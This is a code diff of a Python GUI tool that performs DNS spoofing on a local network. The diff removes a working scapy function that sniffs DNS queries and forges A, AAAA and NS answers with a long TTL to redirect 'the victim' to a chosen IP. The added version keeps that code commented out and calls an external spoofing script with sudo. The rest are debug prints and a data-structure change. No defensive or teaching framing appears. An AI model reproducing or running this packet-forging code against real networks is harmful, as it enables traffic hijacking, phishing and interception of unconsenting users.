@@ -25,7 +25,7 @@ class dns_window(QMainWindow):
         self.t1 = ""
         self.interface = ""
         self.Version = "Ubuntu"
-        self.hostdict = {}
+        self.hostdict = []
         self.setWindowTitle(title)
         self.setGeometry(0,0,500,300) #Set window size
         self.center()
@@ -276,6 +276,7 @@ class dns_window(QMainWindow):
                 IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
                 self.lists.addItem(IP)
             self.interface = IpsMACs[(len(IpsMACs)-1)]
+            print(self.interface)
         elif self.Version == "Windows":
             IpsMACs = self.netretrieveWindows()
             HostIP_MAC = []
@@ -323,10 +324,12 @@ class dns_window(QMainWindow):
         self.dropdown.addItem("All Domains")
         domains = open('domains.txt','r')
         urls = domains.readlines()
+        d = 0
         for url in urls:
             tobytes = bytes(url.strip(), encoding="utf-8")
-            self.hostdict[tobytes] = "1"
+            self.hostdict.append(tobytes)
             self.dropdown.addItem(url.strip())
+            d = d + 1
         self.dropdown.move(320,100)
 
         self.spoofHTML = QRadioButton("Spoof HTML",self) #Create bubble select button
@@ -353,32 +356,33 @@ class dns_window(QMainWindow):
         self.entry.move(320,60)
         self.entry.resize(100,20)
     
-    #Spoof/Poison Functions
-    def dnsSpoof(self,pkt):
-        #if self.q.get() != "stop":
-        for key in self.hostdict.items():
-            print(key) #For loop to check each name in hostDict
-            if (DNS in pkt and Names in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
-                print(f'packet found {Names}')
-                if IP in pkt:
-                    IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst) #Switch source to be destination packet payload is sent back to the victim
-                    UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
-                    Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata=f'{self.ip}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
-                    NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ip}')
-                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
-                    spoofpkt = IPpkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
-                    sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
-                elif IPv6 in pkt:
-                    IPv6pkt = IPv6(dst=pkt[IPv6].src,src=pkt[IPv6].dst) #Switch source to be destination packet payload is sent back to the victim
-                    UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
-                    Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='AAAA',ttl=259200,rdata=f'{self.ipv6}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
-                    NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ipv6}')
-                    DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
-                    spoofpkt = IPv6pkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
-                    sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
-           # self.q.put("run")
-        #else:
-            #SystemExit()
+    #Spoof/Poison Functions, seperate file with this code used instead of this function
+    #def dnsSpoof(self,pkt):
+        #try:
+            #if self.q.get() != "stop":
+            #for key in self.hostdict:#For loop to check each name in hostDict
+                #if (DNS in pkt and key in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
+                    #print(f'packet found {key}')
+                    #if IP in pkt:
+                        #print(pkt[IP].src)
+                        #print(pkt[IP].dst)
+                        #IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst) #Switch source to be destination packet payload is sent back to the victim
+                        #UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
+                        #Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata=f'{self.ip}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
+                        #NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ip}')
+                        #DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
+                        #spoofpkt = IPpkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
+                        #sendp(spoofpkt,iface=f"{self.interface}") #Send spoofed packet to the the victim
+                    #elif IPv6 in pkt:
+                        #IPv6pkt = IPv6(dst=pkt[IPv6].src,src=pkt[IPv6].dst) #Switch source to be destination packet payload is sent back to the victim
+                        #UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
+                        #Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='AAAA',ttl=259200,rdata=f'{self.ipv6}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
+                        #NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ipv6}')
+                        #DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
+                        #spoofpkt = IPv6pkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
+                        #sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
+        #except:
+            #return ""
 
     def set_spoof(self,radio):
         if radio.text() == "Spoof HTML":
@@ -388,8 +392,11 @@ class dns_window(QMainWindow):
                 htmloption = False
 
     def poison(self):
-        pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoof)
-        print(pkt.summary())
+        system('sudo resolvectl flush-caches')
+        system('sudo python3 ../DNS_SPOOF/DNS_SPOOF_copy.py')
+        #pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoof)
+        #print(pkt.summary())
+        self.Stop()
 
     def Start(self):
         failed = 0 #Fail Check
@@ -400,6 +407,7 @@ class dns_window(QMainWindow):
                     getface = self.netretrieveLinux()
                     self.interface = getface[len(getface)-1]
                 system('sudo resolvectl flush-caches')
+                print("DNS Flushed\n")
             elif self.Version == "Windows":
                 if(self.interface == ""):
                     getface = self.netretrieveWindows()
@@ -410,6 +418,7 @@ class dns_window(QMainWindow):
                 try:
                     self.ip = gethostbyname(redirect)
                     self.ipv6 = ""
+                    print(self.ip)
                 except:
                     failed =  failed + 1
                     pass
